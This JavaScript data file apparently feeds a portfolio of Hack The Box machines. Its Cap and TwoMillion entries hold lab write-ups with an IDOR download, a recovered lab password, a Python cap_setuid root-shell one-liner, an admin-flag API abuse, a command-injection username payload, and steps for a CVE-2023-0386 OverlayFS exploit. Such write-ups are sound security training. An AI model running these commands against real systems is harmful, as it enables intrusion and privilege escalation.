export const htbProfile = "https://app.hackthebox.com/users/3032704?profile-top-tab=machines&ownership-period=1M&profile-bottom-tab=prolabs";

export const machines = [
  {
    "name": "Cohort",
    "slug": "cohort-htb",
    "status": "Seasonal",
    "os": "Linux",
    "points": "30",
    "releaseDate": "Not disclosed",
    "completed": "2026"
  },
  {
    "name": "Connected",
    "slug": "connected-htb",
    "status": "Seasonal",
    "os": "Linux / CentOS 7",
    "points": "30",
    "releaseDate": "Not disclosed",
    "completed": "2026"
  },
  {
    "name": "Kobold",
    "slug": "kobold-htb",
    "status": "Seasonal",
    "os": "Linux / Ubuntu",
    "points": "30",
    "releaseDate": "Not disclosed",
    "completed": "2026"
  },
  {
    "name": "Reactor",
    "slug": "reactor-htb",
    "status": "Seasonal",
    "os": "Linux / Ubuntu 24.04",
    "points": "30",
    "releaseDate": "Not disclosed",
    "completed": "2026"
  },
  {
    "name": "Cap",
    "slug": "cap-htb",
    "os": "Linux / Ubuntu",
    "points": "N/A",
    "status": "Retired",
    "releaseDate": "Retired machine",
    "completed": "2026",
    "cves": [],
    "techniques": [
      "IDOR",
      "PCAP analysis",
      "Linux capabilities"
    ],
    "summary": "Cap demonstrates how an IDOR can expose packet captures containing plaintext credentials. Password reuse yields SSH, and a dangerous Python capability provides root.",
    "target": "cap.htb",
    "ports": [
      [
        "21/tcp",
        "FTP",
        "Plaintext credential path"
      ],
      [
        "22/tcp",
        "SSH",
        "Password reuse"
      ],
      [
        "80/tcp",
        "HTTP",
        "Security dashboard"
      ]
    ],
    "nmap": "$ nmap -sC -sV -p- --min-rate 2500 cap.htb\nPORT   STATE SERVICE NOTES\n21/tcp open  ftp     FTP service\n22/tcp open  ssh     Ubuntu OpenSSH\n80/tcp open  http    Security dashboard",
    "observations": [
      "Dashboard download identifiers were sequential.",
      "The zero identifier exposed another capture.",
      "FTP credentials appeared in plaintext inside the PCAP."
    ],
    "enumeration": {
      "body": "The dashboard generated downloadable captures using numeric identifiers. Requesting /download/0 returned a capture outside the current user's expected record, confirming an insecure direct object reference.",
      "findings": [
        "Sequential capture identifiers",
        "Unauthorized access to /download/0",
        "FTP control traffic inside the PCAP",
        "Credential reuse across FTP and SSH"
      ],
      "commands": [
        [
          "bash",
          "Retrieve and inspect the capture",
          "wget http://cap.htb/download/0 -O capture.pcap\ncapinfos capture.pcap\ntcpdump -A -r capture.pcap 'tcp port 21'\ntshark -r capture.pcap -Y ftp.request -T fields -e ftp.request.command -e ftp.request.arg"
        ]
      ]
    },
    "foothold": {
      "body": "Packet analysis recovered the lab FTP credential nathan:Buck3tH4TF0RM3!. Reuse of that password on SSH provided a stable shell as nathan.",
      "steps": [
        "Filter the PCAP for FTP commands.",
        "Recover the USER and PASS values.",
        "Validate the credentials against FTP.",
        "Test authorized password reuse against SSH."
      ],
      "commands": [
        [
          "bash",
          "Validate the recovered lab credential",
          "ftp cap.htb\n# USER nathan\n# PASS Buck3tH4TF0RM3!\nssh nathan@cap.htb"
        ]
      ]
    },
    "post": {
      "body": "Capability enumeration showed /usr/bin/python3.8 with cap_setuid. That capability allows the interpreter to change its process UID to zero, bypassing the normal need for a SUID executable.",
      "steps": [
        "Collect the user proof.",
        "Enumerate file capabilities recursively.",
        "Confirm cap_setuid on Python 3.8.",
        "Set UID zero and execute a root shell."
      ],
      "commands": [
        [
          "python",
          "Capability abuse",
          "getcap -r / 2>/dev/null\n/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nid\ncat /root/root.txt"
        ]
      ]
    },
    "chain": [
      "21/22/80 discovered",
      "Dashboard IDOR",
      "PCAP disclosure",
      "FTP credential recovery",
      "SSH as nathan",
      "Python cap_setuid",
      "Root"
    ],
    "tools": [
      [
        "Nmap",
        "Service discovery"
      ],
      [
        "wget",
        "Object retrieval"
      ],
      [
        "tcpdump / tshark",
        "PCAP analysis"
      ],
      [
        "getcap",
        "Capability enumeration"
      ],
      [
        "Python",
        "UID transition"
      ]
    ],
    "takeaways": [
      "Authorize object access independently of predictable identifiers.",
      "Avoid plaintext protocols for credentials.",
      "Prevent password reuse across services.",
      "Audit file capabilities as carefully as SUID permissions."
    ],
    "userPath": "/home/nathan/user.txt",
    "rootPath": "/root/root.txt"
  },
  {
    "name": "Orion",
    "slug": "orion-htb",
    "status": "Seasonal",
    "os": "Linux / Ubuntu 22.04",
    "points": "30",
    "releaseDate": "Not disclosed",
    "completed": "2026"
  },
  {
    "name": "Nexus",
    "slug": "nexus-htb",
    "status": "Easy Seasonal",
    "os": "Linux / Ubuntu 24.04",
    "points": "30",
    "releaseDate": "Not disclosed",
    "completed": "2026"
  },
  {
    "name": "TwoMillion",
    "slug": "twomillion-htb",
    "os": "Linux / Ubuntu",
    "points": "N/A",
    "status": "Retired",
    "releaseDate": "Retired machine",
    "completed": "2026",
    "cves": [
      "CVE-2023-0386"
    ],
    "techniques": [
      "API authorization abuse",
      "Command injection",
      "OverlayFS"
    ],
    "summary": "TwoMillion exposes a legacy HTB-style API with weak authorization boundaries. Admin API command injection yields a shell before an OverlayFS flaw provides local root.",
    "target": "2million.htb",
    "ports": [
      [
        "22/tcp",
        "SSH",
        "Admin user access"
      ],
      [
        "80/tcp",
        "HTTP",
        "Legacy platform and API"
      ]
    ],
    "nmap": "$ nmap -sC -sV -p- --min-rate 2500 2million.htb\nPORT   STATE SERVICE NOTES\n22/tcp open  ssh     Ubuntu OpenSSH\n80/tcp open  http    Legacy HTB-style web platform",
    "observations": [
      "Client JavaScript disclosed invite API routes.",
      "An authenticated user could change their own admin state.",
      "The admin VPN generator passed input into a shell command."
    ],
    "enumeration": {
      "body": "Reviewing client-side JavaScript revealed /api/v1/invite/generate. The returned Base64 value produced a valid invite code, enabling registration and authenticated API enumeration.",
      "findings": [
        "Invite generation endpoint exposed",
        "Base64-encoded invite response",
        "Self-service admin setting update",
        "VPN generation endpoint accepted command input"
      ],
      "commands": [
        [
          "bash",
          "Generate and decode an invite",
          "curl -s -X POST http://2million.htb/api/v1/invite/generate | jq\necho '<ENCODED_INVITE>' | base64 -d\ncurl -s -b session.txt http://2million.htb/api/v1 | jq"
        ]
      ]
    },
    "foothold": {
      "body": "The authenticated API trusted the caller to update the admin flag. Once elevated, command injection in the VPN generation request executed operating-system commands in the www-data context.",
      "steps": [
        "Register and preserve the authenticated session.",
        "Update the current account's admin setting through the API.",
        "Confirm access to administrative routes.",
        "Inject a harmless identity command into VPN generation before requesting a callback."
      ],
      "commands": [
        [
          "bash",
          "Admin API and command validation",
          "curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \\\n  -H 'Content-Type: application/json' -b session.txt \\\n  --data '{\"email\":\"<ACCOUNT_EMAIL>\",\"is_admin\":1}'\n\ncurl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \\\n  -H 'Content-Type: application/json' -b session.txt \\\n  --data '{\"username\":\"wenli;id;#\"}'"
        ]
      ]
    },
    "post": {
      "body": "The web environment exposed DB_PASSWORD=SuperDuperPass123, reused for SSH as admin. Kernel 5.15.70 was then checked against CVE-2023-0386, an OverlayFS UID mapping flaw. The proof of concept was compiled inside the authorized lab and used to create a privileged shell.",
      "steps": [
        "Read the web .env file and test SSH as admin.",
        "Collect the user proof and record the kernel build.",
        "Confirm the vulnerable OverlayFS conditions.",
        "Compile the proof locally on the target and run it.",
        "Verify UID zero before reading the root proof."
      ],
      "commands": [
        [
          "bash",
          "Credential and OverlayFS path",
          "grep DB_PASSWORD /var/www/html/.env\nssh admin@2million.htb\nuname -a\ngit clone <CVE-2023-0386-LAB-POC>\ncd <POC_DIRECTORY> && make all\n./fuse ./ovlcap/lower ./gc\n./exp\nid"
        ]
      ]
    },
    "chain": [
      "22/80 discovered",
      "Invite API disclosure",
      "Register and self-promote",
      "VPN command injection",
      "Shell as www-data",
      ".env password reuse",
      "SSH as admin",
      "OverlayFS privesc",
      "Root"
    ],
    "tools": [
      [
        "Nmap",
        "Service discovery"
      ],
      [
        "curl / jq",
        "API analysis"
      ],
      [
        "Burp Suite",
        "Authorization testing"
      ],
      [
        "Git / GCC",
        "Lab proof preparation"
      ],
      [
        "SSH",
        "Stable user access"
      ]
    ],
    "takeaways": [
      "Client-side secrecy cannot protect an API route.",
      "Enforce authorization server-side for every state change.",
      "Never pass user input into shell-backed generation jobs.",
      "Kernel privilege escalation requires exact version and environment validation."
    ],
    "userPath": "/home/admin/user.txt",
    "rootPath": "/root/root.txt"
  }
];
